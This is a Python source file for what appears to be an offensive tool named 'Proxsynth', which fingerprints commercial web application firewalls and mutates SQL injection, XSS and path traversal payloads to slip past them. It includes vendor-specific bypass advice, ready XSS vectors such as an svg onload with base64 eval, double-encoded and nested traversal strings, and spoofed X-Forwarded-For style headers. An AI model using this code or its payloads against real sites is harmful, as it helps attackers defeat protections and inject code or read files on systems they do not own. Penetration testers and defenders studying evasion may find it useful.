"""
Proxsynth - Adaptive WAF Evasion & Genetic Payload Mutator Engine
Provides multi-strategy payload obfuscation, intelligent WAF signature fingerprinting,
and adaptive evasion techniques for bypassing modern web application firewalls (Cloudflare, AWS WAF, Akamai, ModSecurity, Imperva).
"""

import re
import urllib.parse
from typing import Dict, Any, List, Optional


WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-mitigated"],
        "body_patterns": [r"cloudflare", r"attention required!\s*\|\s*cloudflare", r"error\s*1020", r"ray\s*id:"],
        "recommendations": [
            "Use Unicode normalization & case alternation",
            "Try HTTP request desync or chunked transfer encoding",
            "Obfuscate SQL keywords with inline comments (/*!50000...*/)",
            "Test origin IP directly to bypass reverse proxy layer"
        ]
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
        "body_patterns": [r"aws\s*waf", r"request\s*blocked\s*by\s*security\s*rules"],
        "recommendations": [
            "Use URL double encoding (%2520, %2527)",
            "Split payloads across multiple request parameters",
            "Use alternate whitespace (%0a, %09, %0c)"
        ]
    },
    "Akamai": {
        "headers": ["x-akamai-transformed", "x-akamai-request-id"],
        "body_patterns": [r"akamai\s*ghost", r"reference\s*#[0-9a-f.]+", r"access\s*denied\s*-\s*akamai"],
        "recommendations": [
            "Utilize HTTP parameter pollution (HPP)",
            "Use hex encoding for string constants (0x...)",
            "Test multipart/form-data encoding instead of application/json"
        ]
    },
    "ModSecurity": {
        "headers": ["mod_security", "modsecurity"],
        "body_patterns": [r"mod_security", r"not\s*acceptable.*mod_security", r"web\s*application\s*firewall"],
        "recommendations": [
            "Insert null bytes (%00) before sensitive paths where applicable",
            "Use comment interleaving (/*!--+*/)",
            "Use variable assignment in SQL injection (@a:=...)"
        ]
    },
    "Imperva / Incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "body_patterns": [r"incapsula", r"incident\s*id:[0-9-]+", r"powered\s*by\s*incapsula"],
        "recommendations": [
            "Use case randomization on parameter names and SQL commands",
            "Use HTML entity and Decimal encoding for XSS payloads",
            "Bypass with chunked transfer-encoding"
        ]
    }
}


def analyze_waf_response(
    status_code: int,
    headers: Dict[str, Any],
    body: str = ""
) -> Dict[str, Any]:
    """Fingerprints active WAF vendor from response status, headers, and body patterns."""
    headers_lower = {str(k).lower(): str(v).lower() for k, v in (headers or {}).items()}
    body_lower = (body or "").lower()

    detected_wafs = []

    for vendor, data in WAF_SIGNATURES.items():
        matched = False
        matched_indicators = []

        # Check headers
        for h in data["headers"]:
            if h in headers_lower:
                matched = True
                matched_indicators.append(f"Header: {h}")

        # Check body patterns
        for pattern in data["body_patterns"]:
            if re.search(pattern, body_lower):
                matched = True
                matched_indicators.append(f"Body signature: {pattern}")

        if matched:
            detected_wafs.append({
                "vendor": vendor,
                "confidence": "HIGH" if len(matched_indicators) > 1 else "MEDIUM",
                "matched_indicators": matched_indicators,
                "recommendations": data["recommendations"]
            })

    is_blocked = (status_code in [403, 406, 429, 503]) and (bool(detected_wafs) or len(body) < 1000)

    return {
        "waf_detected": len(detected_wafs) > 0,
        "is_blocked_response": is_blocked,
        "vendors": detected_wafs,
        "summary": (
            f"Detected {len(detected_wafs)} active WAF signature(s): {', '.join([w['vendor'] for w in detected_wafs])}"
            if detected_wafs else "No known commercial WAF signatures definitively matched"
        )
    }


def mutate_payload(
    raw_payload: str,
    vuln_type: str = "SQLI",
    strategy: str = "ALL"
) -> Dict[str, Any]:
    """Generates multiple obfuscated, evasive mutations for a raw payload based on vulnerability type."""
    clean_payload = raw_payload.strip()
    vuln_upper = (vuln_type or "SQLI").upper()
    strat_upper = (strategy or "ALL").upper()

    mutations = []

    if "SQL" in vuln_upper:
        # 1. Inline comment interleaving
        c1 = re.sub(r'\s+', '/**/', clean_payload)
        mutations.append({
            "name": "Comment Interleaving",
            "description": "Replaces all spaces with inline comment markers",
            "payload": c1
        })

        # 2. MySQL version comment wrapper
        c2 = re.sub(r'\b(SELECT|UNION|FROM|WHERE|OR|AND)\b', r'/*!50000\1*/', clean_payload, flags=re.IGNORECASE)
        mutations.append({
            "name": "MySQL Version Comment Obfuscation",
            "description": "Wraps critical SQL keywords inside /*!50000...*/ blocks",
            "payload": c2
        })

        # 3. Random case alternation
        def random_case(text):
            return "".join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text)])
        c3 = re.sub(r'\b(SELECT|UNION|ALL|FROM|WHERE|AND|OR|SLEEP|BENCHMARK|ORDER BY)\b',
                    lambda m: random_case(m.group(0)), clean_payload, flags=re.IGNORECASE)
        mutations.append({
            "name": "Case Alternation",
            "description": "Alternates uppercase and lowercase across SQL tokens",
            "payload": c3
        })

        # 4. Whitespace substitute (URL newline / tab)
        c4 = re.sub(r'\s+', '%0a', clean_payload)
        mutations.append({
            "name": "URL Linefeed Whitespace",
            "description": "Replaces spaces with encoded newline (%0a)",
            "payload": c4
        })

    elif "XSS" in vuln_upper:
        # 1. SVG onload execution
        mutations.append({
            "name": "SVG Onload Vector",
            "description": "Bypasses standard <script> tag filters via SVG onload",
            "payload": "<svg/onload=eval(atob('YWxlcnQoMSk='))>"
        })

        # 2. Image error with throw statement
        mutations.append({
            "name": "Img Error Vector",
            "description": "Executes payload inside image onerror event",
            "payload": "<img src=x onerror=this.src='data:image/png;base64,';alert(1)>"
        })

        # 3. HTML Entity Decimal Encoding
        def html_decimal_encode(s):
            return "".join([f"&#{ord(c)};" for c in s])
        mutations.append({
            "name": "HTML Decimal Entity",
            "description": "Encodes script content with decimal HTML entities",
            "payload": f"<a href=\"javascript:{html_decimal_encode(clean_payload)}\">click</a>"
        })

    elif "TRAVERSAL" in vuln_upper or "LFI" in vuln_upper:
        # 1. Double URL encoding
        c1 = clean_payload.replace("..", "%252e%252e").replace("/", "%252f")
        mutations.append({
            "name": "Double URL Encoding",
            "description": "Encodes dots and slashes twice (%252e%252e%252f)",
            "payload": c1
        })

        # 2. Nested traversal strips
        c2 = clean_payload.replace("../", "....//").replace("..\\", "....\\\\")
        mutations.append({
            "name": "Nested Traversal Stripping Bypass",
            "description": "Bypasses non-recursive '../' sanitization filters",
            "payload": c2
        })

        # 3. 16-bit Unicode Encoding
        c3 = clean_payload.replace("..", "%u002e%u002e").replace("/", "%u2215")
        mutations.append({
            "name": "16-bit Unicode Bypass",
            "description": "Encodes characters using 16-bit wide Unicode representations",
            "payload": c3
        })

    # Generic: HTTP Header Spoofing set
    header_spoofs = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Custom-IP-Authorization": "127.0.0.1"
    }

    return {
        "raw_payload": clean_payload,
        "vuln_type": vuln_upper,
        "mutation_count": len(mutations),
        "mutations": mutations,
        "evasion_headers": header_spoofs
    }
